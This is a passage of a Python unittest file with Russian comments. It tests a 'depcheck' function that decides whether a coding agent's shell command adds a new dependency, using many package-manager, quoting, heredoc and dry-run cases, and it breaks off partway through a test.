            "opam install --switch 5.1 dune",
            "luarocks install luasocket",
            "luarocks --local install luasocket",
            "luarocks install --tree lua_modules penlight 1.13.1",
            "cpan Moose",
            "cpan -i Moose",
            "cpan -fi Moose",
            "cpanm Moose",
            "cpanm -n --local-lib ~/perl5 Moose",
            "cpanm --installdeps Moose",
            "vcpkg install zlib",
            "vcpkg install zlib:x64-windows",
            "vcpkg install --triplet x64-linux fmt",
            "vcpkg add port fmt",
            "conan install --requires=zlib/1.3",
            "conan install --requires zlib/1.3 --build=missing",
            "conan install --tool-requires=cmake/3.27.0",
            "conan install zlib/1.2.11@",
            "conan install zlib/1.2.11@conan/stable",
            "nuget install Newtonsoft.Json",
            "nuget install Newtonsoft.Json -Version 13.0.1 -OutputDirectory packages",
            "nuget.exe install Serilog -o pkgs",
            "R -e 'install.packages(\"dplyr\")'",
            "Rscript -e \"install.packages('dplyr', repos = 'https://cloud.r-project.org')\"",
            "Rscript -e 'remotes::install_github(\"r-lib/cli\")'",
            "Rscript -e 'devtools::install_github(\"x/y\")'",
            "Rscript -e 'pak::pkg_install(\"dplyr\")'",
            "Rscript -e 'BiocManager::install(\"DESeq2\")'",
            "Rscript -e 'renv::install(\"dplyr\")'",
            "R --no-save -q -e 'library(x)' -e 'install.packages(\"y\")'",
        ]:
            self.assertIsNotNone(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in [
            "pdm install",
            "pdm sync",
            "pdm update",
            "pdm lock",
            "pdm list",
            "pdm remove requests",
            "pdm add -e ./local",
            "pdm add ./local",
            "pdm add",
            "pdm run pytest",
            "hatch env create",
            "hatch run test",
            "hatch run test:cov",
            "hatch build",
            "hatch dep show requirements",
            "rye sync",
            "rye lock",
            "rye remove httpx",
            "rye add mypkg --path ./mypkg",
            "rye run pytest",
            "rye fetch 3.12",
            "pixi install",
            "pixi update",
            "pixi upgrade",
            "pixi list",
            "pixi search numpy",
            "pixi remove numpy",
            "pixi run test",
            "pixi run -e test pytest",
            "pixi exec cowsay",
            "pixi global list",
            "pixi global update",
            "mix deps.get",
            "mix deps.update --all",
            "mix deps.compile",
            "mix local.hex --force",
            "mix local.rebar --force",
            "mix archive.install",
            "mix archive.install ./x.ez",
            "mix archive.install --force",
            "mix compile",
            "mix test",
            "cabal install",
            "cabal install exe:foo",
            "cabal install --installdir ~/.local/bin",
            "cabal install all",
            "cabal install .",
            "cabal update",
            "cabal build",
            "cabal test",
            "stack install",
            "stack install :my-exe",
            "stack install --local-bin-path bin",
            "stack build",
            "stack test",
            "stack setup",
            "opam install .",
            "opam install . --deps-only",
            "opam install ./foo.opam",
            "opam install --switch 5.1",
            "opam update",
            "opam upgrade",
            "opam list",
            "opam switch create 5.1.0",
            "luarocks make",
            "luarocks list",
            "luarocks search luasocket",
            "luarocks remove luasocket",
            "luarocks install ./x-1.0-1.rockspec",
            "luarocks install --tree lua_modules",
            "cpan",
            "cpan -l",
            "cpan -u",
            "cpan -O",
            "cpan -D Moose",
            "cpan -t Moose",
            "cpan -a",
            "cpan .",
            "cpanm --installdeps .",
            "cpanm .",
            "cpanm --self-upgrade",
            "cpanm --uninstall Moose",
            "cpanm -U Moose",
            "cpanm --info Moose",
            "cpanm --showdeps .",
            "cpanm -l local --installdeps .",
            "vcpkg install",
            "vcpkg install --triplet x64-linux",
            "vcpkg list",
            "vcpkg search zlib",
            "vcpkg remove zlib",
            "vcpkg update",
            "vcpkg upgrade",
            "vcpkg add port",
            "conan install .",
            "conan install . --build=missing",
            "conan install . -of build -s build_type=Release",
            "conan install conanfile.txt",
            "conan install build/conanfile.py",
            "conan install .. -pr default",
            "conan create .",
            "conan search zlib",
            "nuget install packages.config",
            "nuget install packages.config -OutputDirectory packages",
            "nuget restore",
            "nuget restore App.sln",
            "nuget list",
            "R -e 'devtools::install()'",
            "Rscript -e 'devtools::install_deps()'",
            "Rscript -e 'remotes::install_deps(dependencies = TRUE)'",
            "Rscript -e 'renv::restore()'",
            "Rscript -e 'renv::install()'",
            "Rscript -e 'pak::pak()'",
            "Rscript -e 'install.packages(\".\", repos = NULL, type = \"source\")'",
            "Rscript -e 'testthat::test_dir(\"tests\")'",
            "Rscript script.R",
            "R CMD INSTALL pkg_1.0.tar.gz",
            "R CMD check .",
            "Rscript -e 'library(dplyr)'",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class BroadRunTest(unittest.TestCase):
    """Обычные команды агента не отклоняются."""

    def test_ordinary_commands(self):
        for cmd in [
            "ls -la", "pwd", "cd src && ls", "cat README.md", "head -50 file.py", "tail -f log.txt",
            "grep -rn 'install' .", "rg 'apt install' docs/", "find . -name '*.py' -newer setup.py",
            "wc -l *.py", "sed -n '1,20p' x.py", "awk '{print $1}' f", "sort -u names | uniq -c",
            "diff -u a b", "mkdir -p build/out", "rm -rf build", "cp -r src dst", "mv a b", "chmod +x run.sh",
            "ln -s ../x y", "touch .keep", "du -sh .", "df -h", "ps aux | grep python", "kill -9 1234",
            "which python3", "type npm", "command -v brew", "echo $PATH", "env | sort", "export A=1",
            "source .venv/bin/activate", ". ./env.sh", "date", "uname -a", "whoami", "id -u",
            "git status", "git diff --stat", "git log --oneline -20", "git add -A", "git commit -m 'install deps'",
            "git checkout -b feature/apt", "git push -u origin main", "git stash pop", "git rebase main",
            "git submodule update --init --recursive", "git grep 'brew install'", "gh pr view 12",
            "make", "make test", "make install", "make -j8 all", "cmake -B build -S .", "cmake --build build",
            "cmake --install build --prefix ~/.local", "ninja -C build", "meson setup build",
            "./configure --prefix=/usr",
            "python3 -m unittest -v", "python3 -m pytest -x", "pytest -k install", "python3 script.py --install",
            "python3 -c 'print(1)'", "python3 -m venv .venv", "python3 -m http.server 8000", "tox -e py312",
            "node index.js", "npm run build", "npm test", "npm ls", "npm outdated", "npm audit",
            "npx tsc --noEmit", "yarn", "yarn install --frozen-lockfile", "pnpm install --frozen-lockfile",
            "cargo build --release", "cargo test", "cargo clippy", "cargo fmt", "cargo update",
            "go build ./...", "go test ./...", "go mod tidy", "go mod download", "go vet ./...",
            "docker build -t app .", "docker run --rm -it app", "docker compose up -d", "docker ps",
            "docker exec -it c bash", "kubectl get pods", "kubectl apply -f k8s/", "helm install rel ./chart",
            "helm repo add bitnami https://charts.bitnami.com/bitnami", "terraform init", "terraform plan",
            "ansible-playbook site.yml", "systemctl status nginx", "journalctl -u nginx -n 50",
            "curl -sSL https://e.com/api | jq .", "wget -q https://e.com/f.tar.gz", "tar xzf f.tar.gz",
            "unzip x.zip", "ssh host uptime", "scp f host:/tmp/", "rsync -av src/ host:dst/",
            "brew --prefix", "brew --version", "apt-cache policy jq", "dpkg -l | grep jq", "rpm -qa",
            "pacman -Qe", "snap version", "flatpak --version", "nix --version", "nix-env --version",
            "conda env list", "conda activate base", "conda list", "pip list", "pip freeze > requirements.txt",
            "pip show requests", "pip check", "uv sync", "uv lock", "poetry install",
            "poetry lock", "bundle install", "bundle exec rspec", "composer install",
            "opam env", "Rscript analysis.R",
            "R --version", "port version", "zypper lr", "dnf repolist", "yum repolist", "apk version",
            "choco --version", "winget --version", "scoop status", "vcpkg version", "conan profile detect",
            "nuget help", "pixi info", "pdm info", "rye show", "hatch version", "cpanm --version",
            "echo 'apt-get install jq' >> notes.md", "printf '%s\\n' 'brew install jq'",
            'git commit -m "docs: apt install jq, brew install jq, pacman -S jq"',
            "cat <<'EOF' > INSTALL.md\nsudo apt-get install -y jq\nbrew install jq\nEOF",
            "grep -n 'pacman -S' README.md", "man apt-get", "apt-get --help", "brew help install",
            "stack --version", "port help install", "sleep 5", "true", ":", "exit 0", "time make",
            "watch -n1 ls", "xargs -0 rm < files", "tee out.log", "jq '.dependencies' package.json",
            "ls install", "./install.sh", "bash install.sh --prefix ~/.local", "sh -c 'make install'",
        ]:
            self.assertIsNone(depcheck.dependency_add(cmd), cmd)


class UvFlagsTest(unittest.TestCase):
    """Флаги со значением `uv pip install` и `uv add` — по `uv pip install --help` и `uv add --help` uv 0.12."""

    def test_flag_values_are_not_packages(self):
        for cmd in [
            "uv pip install --extra dev -e .",
            "uv pip install --extra dev -r pyproject.toml",
            "uv pip install --exclude-newer 2024-01-01 -e .",
            "uv pip install --prerelease allow -r r.txt",
            "uv pip install --link-mode copy -r r.txt",
            "uv pip install -e . --refresh-package foo",
            "uv pip install --torch-backend cpu -r r.txt",
            "uv pip install --overrides o.txt --excludes e.txt -b b.txt -r r.txt",
            "uv pip install --index-strategy unsafe-best-match --fork-strategy fewest -r r.txt",
            "uv pip install --output-format json -r r.txt",
            "uv add --prerelease allow -r r.txt",
            "uv add --index-url https://e.com/simple -r r.txt",
            "uv add --exclude-newer 2024-01-01 --no-install-package x -r r.txt",
            "uv pip -q install -r r.txt",
            "uv pip --cache-dir /c install -r r.txt",
        ]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_package_after_flag_value_detected(self):
        for cmd in [
            "uv pip install --extra dev httpx",
            "uv pip install --prerelease allow httpx",
            "uv add --prerelease allow httpx",
            "uv add --index-url https://e.com/simple httpx",
            "uv pip -q install httpx",
            "uv pip --cache-dir /c install httpx",
        ]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_cert_value_is_not_package(self):
        self.assertIsNone(depcheck.dependency_add("uv pip install --cert ca -r r.txt"))
        for cmd in ["uv --cert ca pip install -r r.txt", "uv add --cert ca -r r.txt",
                    "uv tool install --cert ca .", "uv run --cert ca script.py"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class HeredocInQuotedSubstitutionTest(unittest.TestCase):
    """Heredoc внутри `"$(…)"` на несколько строк — форма сообщения коммита агента
    (`git commit -m "$(cat <<'EOF' … EOF )"`): тело кончается внутри кавычки."""

    def test_command_after_quote_detected(self):
        for cmd in [
            "git commit -m \"$(cat <<'EOF'\nmsg\nEOF\n)\"\nnpm install x",
            "x=\"$(cat <<EOF\nhi\nEOF\n)\"\nnpm install x",
            "git commit -m \"$(cat <<'EOF'\nfix: handle 12\" screens\nEOF\n)\" && npm install x",
        ]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm install x")

    def test_body_with_odd_quote_is_data(self):
        cmd = "git commit -m \"$(cat <<'EOF'\nfix: handle 12\" screens\nnpm install x\nEOF\n)\""
        self.assertIsNone(depcheck.dependency_add(cmd))

    def test_heredoc_before_open_quote_starts_after_quote(self):
        # Тело heredoc, открытого до многострочной кавычки, начинается после строки, где она закрылась.
        for cmd in ['cat <<EOF > f; echo "a\nb"\nnpm install x\nEOF\nnpm install y',
                    "cat \"f\" <<EOF $'a\nb'\nnpm install x\nEOF\nnpm install y"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm install y")

    def test_heredoc_to_shell_inside_quote_runs_body(self):
        # Тело heredoc оболочки внутри `"$(…)"` исполняется, как и вне кавычек.
        for cmd in [
            'x="$(bash <<EOF\nnpm install x\nEOF\n)"',
            'echo "$(sh <<EOF\nnpm install x\nEOF\n)"',
            'echo "$(echo a | bash <<EOF\nnpm install x\nEOF\n)"',
        ]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_heredoc_to_cat_inside_quote_is_data(self):
        self.assertIsNone(depcheck.dependency_add("git commit -m \"$(cat <<'EOF'\nnpm install x\nEOF\n)\""))
        cmd = "git commit -m \"$(cat <<'EOF'\nnpm install x\nEOF\n)\"\nnpm install x"
        self.assertEqual(depcheck.dependency_add(cmd), "npm install x")


class PythonInterpreterFlagsTest(unittest.TestCase):
    def test_value_flag_glued_or_separate_before_m(self):
        for cmd in ["python -Wignore -m pip install x", "python -W ignore -m pip install x",
                    "python -Xutf8 -m pip install x"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_glued_c_is_code_not_module(self):
        for cmd in ["python -cm pip install x", "python -c 'import x'", "python -Ic 'import x' -m pip install x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class PipGlobalFlagsTest(unittest.TestCase):
    """Общие опции pip перед подкомандой — по `pip --help` (General Options)."""

    def test_detected(self):
        for cmd in [
            "pip -q install requests",
            "pip --no-cache-dir install requests",
            "python -m pip -q install requests",
            "pip --python .venv/bin/python install requests",
            "pip --log l.txt --timeout 30 --proxy p install requests",
            "pip --disable-pip-version-check --isolated install requests",
        ]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["pip --python .venv/bin/python install -r r.txt", "pip -q list", "pip --cache-dir /c freeze"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class ToolchainAndAliasTest(unittest.TestCase):
    def test_detected(self):
        for cmd in [
            "cargo +nightly install cargo-fuzz",
            "cargo +stable add serde",
            "python -Im pip install x",
            "python -sm pip install x",
            "python -Impip install x",
            "composer req monolog/monolog",
            "composer r monolog/monolog",
        ]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["cargo +nightly build", "cargo +nightly install --path .", "python -Ic 'import pip'",
                    "python -Wignore script.py", "python -sm pytest", "composer req", "composer re x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class ValueFlagTableTest(unittest.TestCase):
    """Флаг со значением без пакета — не добавление; тот же флаг с пакетом — добавление."""

    CASES = [
        ("bun add --cwd sub", "bun add --cwd sub zod"),
        ("deno add --config deno.json", "deno add --config deno.json npm:chalk"),
        ("yarn add --cwd sub", "yarn add --cwd sub react"),
        ("uv tool install --python 3.12 --editable .", "uv tool install --python 3.12 ruff"),
        ("pipx install --python 3.12 .", "pipx install --python 3.12 black"),
        ("pipenv install --python 3.12", "pipenv install --python 3.12 requests"),
        ("cargo install --root /opt --path .", "cargo install --root /opt ripgrep"),
        ("poetry add --group dev", "poetry add --group dev pytest"),
        ("bundle add -v 1.0", "bundle add -v 1.0 rails"),
        ("go get -modfile alt.mod", "go get -modfile alt.mod golang.org/x/y"),
        ("dotnet add package -v 1.0", "dotnet add package -v 1.0 Serilog"),
        ("dotnet tool install --tool-path tools", "dotnet tool install --tool-path tools dotnet-ef"),
        ("dart pub add -C sub", "dart pub add -C sub http"),
        ("swift package add-dependency --from 1.0.0",
         "swift package add-dependency --from 1.0.0 https://github.com/apple/swift-log"),
        ("swift package --package-path sub add-dependency --from 1.0.0",
         "swift package --package-path sub add-dependency https://github.com/apple/swift-log"),
        ("apk add -X https://e.com/repo", "apk add -X https://e.com/repo curl"),
        ("zypper install --from repo", "zypper install --from repo git"),
        ("scoop install -a 64bit", "scoop install -a 64bit git"),
        ("snap install --channel edge", "snap install --channel edge lxd"),
        ("flatpak install --installation x", "flatpak install --installation x flathub org.gimp.GIMP"),
        ("pixi add --feature test", "pixi add --feature test pytest"),
        ("cabal install --installdir bin", "cabal install --installdir bin pandoc"),
        ("vcpkg add port --triplet x64-linux", "vcpkg add port --triplet x64-linux fmt"),
        # Глобальные флаги перед подкомандой.
        ("deno -c deno.json add", "deno -c deno.json add npm:chalk"),
        ("go -C sub get", "go -C sub get golang.org/x/y"),
        ("cargo -Z unstable add", "cargo -Z unstable add serde"),
        ("yarn --cwd sub add", "yarn --cwd sub add react"),
        ("pipenv --python 3.12 install", "pipenv --python 3.12 install requests"),
        ("aptitude -w 80 install", "aptitude -w 80 install htop"),
        # Псевдонимы подкоманды.
        ("npm in", "npm in lodash"),
        ("npm isnt", "npm isnt lodash"),
        ("pnpm install", "pnpm install lodash"),
        ("bun a", "bun a zod"),
        ("dnf in", "dnf in jq"),
        ("dnf localinstall ./x.rpm", "dnf localinstall https://e.com/x.rpm"),
        # Регистр: флаги choco, подкоманда nuget.
        ("choco install --Version 1.0", "choco install --Version 1.0 git"),
        ("nuget Install packages.config", "nuget Install Newtonsoft.Json"),
    ]

    def test_table(self):
        for without, with_package in self.CASES:
            with self.subTest(without):
                self.assertIsNone(depcheck.dependency_add(without))
            with self.subTest(with_package):
                self.assertEqual(depcheck.dependency_add(with_package), with_package)


class ParserEdgesTest(unittest.TestCase):
    def test_wrappers(self):
        for cmd in ["exec npm install x", "exec -a name npm install x", "command npm install x",
                    "builtin npm install x", "doas npm install x", "doas -u bob npm install x",
                    "env --split-string 'npm install x'"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))
        for cmd in ["exec -a npm make", "doas -u npm make", "env --split-string 'make test'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_go_install_without_version_not_adds(self):
        self.assertIsNone(depcheck.dependency_add("go install github.com/me/proj/cmd/tool"))

    def test_ansi_c_quoted_word(self):
        # `\'` внутри `$'…'` не закрывает строку: слово — флаг `--save' x`, а не пакет.
        self.assertIsNone(depcheck.dependency_add("npm install $'--save\\' x'"))
        self.assertIsNotNone(depcheck.dependency_add("npm install $'left-pad'"))

    def test_nesting_depth_boundary(self):
        # README: вложенные команды глубже 4 уровней не разбираются.
        self.assertEqual(depcheck._MAX_DEPTH, 4)
        self.assertIsNotNone(depcheck.dependency_add("eval " * 4 + "npm install x"))
        self.assertIsNone(depcheck.dependency_add("eval " * 5 + "npm install x"))

    def test_words_limit_boundary(self):
        # README: на слова разбираются первые 4096 символов команды — слов с разделителем от её имени.
        self.assertEqual(depcheck._WORDS_LIMIT, 4096)
        head = "A=" + "a" * 5000 + " sudo -E npm install "
        inside = head + "-D " * 1361 + "left-pad"
        beyond = head + "-D " * 1362 + "left-pad"
        self.assertIsNotNone(depcheck.dependency_add(inside))
        self.assertIsNone(depcheck.dependency_add(beyond))
        self.assertEqual(depcheck.dependency_doubt(beyond)[1], depcheck._WHY_CUT)


class NestedQuotesInSubstitutionTest(unittest.TestCase):
    """Кавычки внутри `"$(…)"` вложены: внутренняя `"` не закрывает внешнюю. Форма — тело PR и коммита агента
    (`gh pr create --body "$(printf "…")"`, `git commit -m "$(cat <<'EOF'` … `)"`)."""

    def test_text_inside_nested_quotes_is_data(self):
        for cmd in [
            'echo "$(echo "a; npm install x")"',
            'gh pr create --body "$(printf "Steps:\\n1) pip install mylib==1.0\\n2) run")"',
            'printf "%s\\n" "$(echo "a; echo npm install x")"',
            "git commit -m \"$(\ncat <<'EOF'\n1) Run `npm install foo` first.\nEOF\n)\"",
            "git commit -m \"$(\ncat <<'EOF'\nfix: 12\" screens; npm install x\nEOF\n)\"",
        ]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_commands_inside_and_after_detected(self):
        for cmd, segment in [
            ('echo "$(echo "a"; npm install x)"', 'echo "$(echo "a"; npm install x)"'),
            ('echo "$(echo "a")" && npm install x', "npm install x"),
            ("git commit -m \"$(\ncat <<'EOF'\nmsg)\nEOF\n)\"\nnpm install x", "npm install x"),
            ('x="$(\nbash <<EOF\nnpm install x\nEOF\n)"', 'x="$(\nbash <<EOF\nnpm install x\nEOF\n)"'),
            ('echo "$(echo "$(npm install x)")"', 'echo "$(echo "$(npm install x)")"'),
            ('A="$(echo "a b")" npm install x', 'A="$(echo "a b")" npm install x'),
        ]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), segment)


class ProjectLocalPackagesTest(unittest.TestCase):
    """Пакеты самого проекта (workspace, `link:`, `portal:`, `--path`) — не новая зависимость."""

    def test_not_adds(self):
        for cmd in [
            "pnpm add @org/utils@workspace:*",
            "pnpm add @org/utils@workspace:^1.0.0",
            "pnpm add workspace:../utils",
            "yarn add link:../lib",
            "yarn add portal:../lib",
            "yarn add lib@link:../lib",
            "yarn add lib@portal:../lib",
            "pnpm add @org/utils --workspace",
            "cargo add mylib --path ../mylib",
            "cargo add --path=../mylib mylib",
            "bundle add mygem --path ../mygem",
        ]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_still_detected(self):
        for cmd in ["pnpm add @org/utils", "pnpm add --workspace-root lodash", "yarn add lodash@npm:other",
                    "cargo add serde --git https://github.com/x/serde", "bundle add rails --version 7.1"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)


class EscapedQuoteTest(unittest.TestCase):
    def test_escaped_quote_inside_double_quotes(self):
        self.assertIsNone(depcheck.dependency_add('git commit -m "docs: say \\"hi\\"; npm install x in README"'))
        self.assertEqual(depcheck.dependency_add('git commit -m "fix: quote \\"a\\"" && npm install x'),
                         "npm install x")


class MarkerOrderTest(unittest.TestCase):
    def test_marker_before_other_assignment(self):
        self.assertIsNone(depcheck.dependency_add("PLANKA_DEP_OK=1 CI=1 npm install x"))


class SubstitutionBoundsTest(unittest.TestCase):
    """Конец `$(…)` в двойных кавычках: кавычки, `\\` и скобки внутри подстановки."""

    def test_detected(self):
        for cmd in ["echo \"$(echo ')' ; npm install x)\"", "echo \"$(echo \\) ; npm install x)\"",
                    "echo \"$( (cd a) ; npm install x)\"", "echo $'it\\'s' \"$(npm install x)\"",
                    # `\$'` — `$` экранирован, кавычка обычная: `\'` её закрывает.
                    "echo \\$'a\\' \"$(npm install x)\"",
                    # Арифметика на две строки не прячет подстановку за ней.
                    "echo \"$((1<<x\n))\" \"$(npm install x)\""]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_quoted_substitution_is_text(self):
        for cmd in ["echo '\"$(npm install x)\"'", "echo $'a\\'\"$(npm install x)\"'"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class HeredocOpenerEdgesTest(unittest.TestCase):
    def test_not_heredoc_opener(self):
        # Экранированный `<<`, сдвиг в `"$((…))"` и `<<` внутри `$'…'` heredoc не открывают.
        for cmd in ["echo \\<<EOF\nnpm install x", 'echo "$((1<<2))"\nnpm install x',
                    "cat $'a\\'<<EOF' \nnpm install x"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm install x")

    def test_shell_body_runs(self):
        # `-s` — команды из stdin и при позиционных; оболочка в любом сегменте строки с `<<`.
        for cmd in ["bash -s arg <<EOF\nnpm install x\nEOF", "bash -s foo <<EOF\nnpm install x\nEOF",
                    "cat <<EOF | bash; echo\nnpm install x\nEOF", "bash <<EOF && echo hi\nnpm install x\nEOF"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), "npm install x")


class DryRunTest(unittest.TestCase):
    """Пробный прогон ничего не ставит."""

    def test_not_adds(self):
        for cmd in ["pip install --dry-run requests", "npm install --dry-run lodash", "cargo add --dry-run serde",
                    "poetry add --dry-run requests", "apt-get install -s jq", "apt-get -s install jq",
                    "apt-get install -qs jq", "apt install --simulate jq", "apt-get install --just-print jq",
                    "python -m pip install --dry-run requests", "uv pip install --dry-run httpx"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_still_detected(self):
        for cmd in ["npm install --dry-run=false lodash", "apt-get install -y jq", "apt-get install -t sid jq",
                    "apt-get install -tsid jq"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)


class LauncherTest(unittest.TestCase):
    """Запускатели менеджера: суффикс Windows в любом регистре, `corepack`, `npx`, `time` с флагами."""

    def test_detected(self):
        for cmd in ["NPM.CMD install x", "Pip.Exe install requests", "corepack pnpm add x", "corepack yarn@4.1.0 add x",
                    "npx pnpm add x", "npx -y yarn add x", "npx pnpm@9 add x", "npx -- pnpm add x",
                    "bunx pnpm add x", "/usr/bin/time -f %e npm i x", "time -o t.txt npm i x",
                    "time --format=%e npm i x", "Rscript.exe -e 'install.packages(\"x\")'"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in ["corepack enable", "corepack pnpm install", "npx -p pnpm pnpm install", "npx -y cowsay hi",
                    "/usr/bin/time -f %e make", "NPM.CMD run build"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class ParserBranchesTest(unittest.TestCase):
    """По входу на ветку разбора: вход различает, работает ли ветка."""

    DETECTED = [
        "if a; then :; elif npm install x; then :; fi",
        "env -C sub npm install x",
        'fish -c "npm install x"',
        "bash +c 'npm install x'",
        "pypy3 -m pip install x",
        "python -X utf8 -m pip install x",
        "pacman --sync jq",
        "nix-env -f https://e.com/x.tar.gz -iA hello",
        "nix --option substituters https://cache profile install nixpkgs#hello",
        "vcpkg add artifact cmake",
        "npm install >&2 x",
        "pnpm i lodash",
        "deno i npm:chalk",
    ]
    NOT_ADDS = [
        "uv tool install --with ./x --editable .",
        "cargo install --version 1.0 --path .",
        "cargo install --version 1.0 --locked",
        "rye add --features x",
        "mix archive.install hex",
        "cpanm --info=1 Moose",
        "conan install -pr x/y@ .",
        "conan install -pr:h x/y@ .",
        "nix-env -i --arg a b",
        "nix-env -i -f default.nix hello",
        "port install +universal",
        "make &>log npm install x",
    ]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class DryRunValueTest(unittest.TestCase):
    """Значение флага пробного прогона: npm разбирает флаги nopt (`--dry-run false`, `--no-dry-run`, сокращение
    `--dr`), apt и apt-get — CommandLine apt (`-s no`, `--simulate=off`, `--no-simulate`); проверено на npm 11.16
    (`npm config get dry-run …`) и по apt-pkg/contrib/cmndline.cc."""

    DETECTED = [
        "npm install foo --dry-run false",
        "npm install --dry-run false foo",
        "npm install --dry-run=false foo",
        "npm install --no-dry-run foo",
        "npm install --No-dry-run foo",
        "npm install --no-dry-run=true foo",
        "npm install --dry-run --no-dry-run foo",
        "npm install --dr false foo",
        "npm install foo -- --dry-run",
        "npx npm install --dry-run false foo",
        "uv run npm install --dry-run false foo",
        "apt-get install --dry-run false jq",
        "apt-get install -s no jq",
        "apt-get install -s0 jq",
        "apt-get install -s=false jq",
        "apt-get install --simulate=off jq",
        "apt-get install --Simulate no jq",
        "apt install --no-simulate jq",
        "apt-get install --no-s jq",
        "apt-get --just-print=0 install jq",
        "apt-get install --no-no-act jq",
        "apt-get install -t no --no-recon jq",
        "apt-get install -s --no-s jq",
        "apt-get install -s --no-recon jq",
        "apt-get install --no-simulate ' -1' jq",
        "apt-get -s no install jq",
        "apt-get --simulate no install jq",
        "apt-get install -s 0 jq",
        "apt-get install -s0x0 jq",
        "apt-get install -s 0X0 jq",
        "apt-get install -ts jq",
        "apt-get -q 2 install jq",
        "apt-get -q2 install jq",
        "apt-get -q +2 install jq",
        "apt-get --quiet 2 install jq",
        "apt-get --silent=1 install jq",
        "apt-get -qq install jq",
        "apt-get -q install jq",
        "apt-get install -q jq",
        "npm install --d foo",
        "brew install -s jq",
        "brew install --cc gcc-14 jq",
        "brew install -- -n jq",
        "brew install +nv jq",
    ]
    NOT_ADDS = [
        "npm install --dry-run true foo",
        "npm install --dry-run=true foo",
        "npm install --dry-run=x foo",
        "npm install --no-dry-run --dry-run foo",
        "npm install --no-dry-run false foo",
        "npm install --dry foo",
        "npm --dry-run install foo",
        "pip install --dry-run false requests",
        "bun add --dry-run false x",
        "apt-get install --dry-run jq",
        "apt-get install --no-simulate yes jq",
        "apt-get install --yes-simulate jq",
        "apt-get install --simulate=maybe jq",
        "apt-get install --no-dry-run --dry-run jq",
        "apt-get install -s1 jq",
        "apt-get install -sy jq",
        "apt-get install -s --no-act jq",
        "apt-get -y -s install jq",
        "aptitude install -s jq",
        "aptitude install --simulate jq",
        "apt-get install -q 2",
        "apt-get install -s 2 jq",
        "apt-get install -s0x1 jq",
        "apt-get install -s 0X1 jq",
        "apt-get install --no-simulate=maybe jq",
        "apt-get -q=x install jq",
        "apt-get install --quiet=x jq",
        "apt-get -q 2 -s install jq",
        "apt-get -qs install jq",
        "apt-get -q 2x install jq",
        "npm install --dr foo",
        "npm install --no-no-dry-run foo",
        "brew install -n jq",
        "brew install -vn jq",
        "brew install jq --dry-run",
    ]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class BacktickInDoubleQuotesTest(unittest.TestCase):
    """`` `…` `` внутри `"…"` — свой уровень до неэкранированной обратной кавычки: кавычки внутри не закрывают
    внешнюю (как в bash 5.3)."""

    def test_text_inside_is_data(self):
        for cmd in [
            'git commit -m "fix `echo "a; npm install x"` text"',
            'echo "x `echo "it\'s"` y; npm install x"',
            'npm install --tag "`date "+%Y %m"`"',
            'git commit -m "a `echo\n"b; npm install x"` c"',
        ]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))

    def test_commands_inside_and_after_detected(self):
        for cmd, segment in [
            ('echo "a `echo \'it"s\'` c"; npm install x', "npm install x"),
            ('echo "`echo "b"; npm install x`"', 'echo "`echo "b"; npm install x`"'),
            ('echo "a `echo\n"b"` c"; npm install x', "npm install x"),
            ('npm install --tag "`date "+%Y %m"`" left-pad', 'npm install --tag "`date "+%Y %m"`" left-pad'),
            ('echo "`echo a\\`b\\` ; npm install q` x"', 'echo "`echo a\\`b\\` ; npm install q` x"'),
        ]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), segment)

    def test_heredoc_opener_inside_backticks_ignored(self):
        self.assertEqual(depcheck.heredocs('echo "`echo "x"` <<EOF"'), [])

    def test_linear(self):
        cases = [
            lambda n: 'echo "' + '`a "b"` ' * n + '"; npm install x',
